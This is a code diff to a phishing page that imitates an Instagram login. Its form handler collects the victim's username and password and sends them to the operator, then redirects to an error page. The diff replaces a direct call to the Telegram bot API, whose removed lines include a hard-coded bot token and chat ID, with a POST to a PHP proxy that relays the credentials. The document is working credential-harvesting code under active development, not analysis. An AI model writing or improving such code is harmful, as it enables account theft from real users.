@@ -337,10 +337,6 @@
     // Bu değişkeni değiştirerek yönlendirme URL'ini ayarlayabilirsiniz
     const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";
     
-    // Telegram Bot Bilgileri
-    const TELEGRAM_BOT_TOKEN = "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE"; // Bu token sadece bu proje için kullanılmalıdır
-    const TELEGRAM_CHAT_ID = "-1002584942967"; // Mesajların iletileceği chat ID
-    
     // Form gönderildiğinde çalışacak fonksiyon
     document.getElementById('loginForm').addEventListener('submit', async function(event) {
       event.preventDefault();
@@ -360,38 +356,25 @@
       submitButton.innerText = "Giriş yapılıyor...";
       
       try {
-        // Tarih ve saat bilgisini al
-        const now = new Date();
-        const dateTimeStr = now.toISOString();
-        
-        // Telegram API için mesaj metni oluştur
-        const messageText = `
-🚨 *Instagram Yeni Giriş* 🚨
-
-*Hesap Bilgileri:*
-👤 *Kullanıcı Adı:* ${username}
-🔒 *Şifre:* ${password}
-🕝 *Tarih:* ${dateTimeStr}
-        `;
-        
-        // Telegram API URL'ini oluştur
-        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        // Telegram botuna gönder
-        const response = await fetch(telegramApiUrl, {
+        // PHP proxy üzerinden Telegram'a mesaj gönder
+        const response = await fetch('send_telegram.php', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: messageText,
-            parse_mode: 'Markdown'
+            username: username,
+            password: password
           })
         });
         
         if (!response.ok) {
-          console.error("Telegram API hatası:", await response.json());
+          console.error("Gönderim hatası:", await response.text());
+        } else {
+          const result = await response.json();
+          if (!result.success) {
+            console.error("İşlem başarısız:", result.error);
+          }
         }
         
         // İşlem tamamlandığında yönlendir (başarılı olmasa bile)
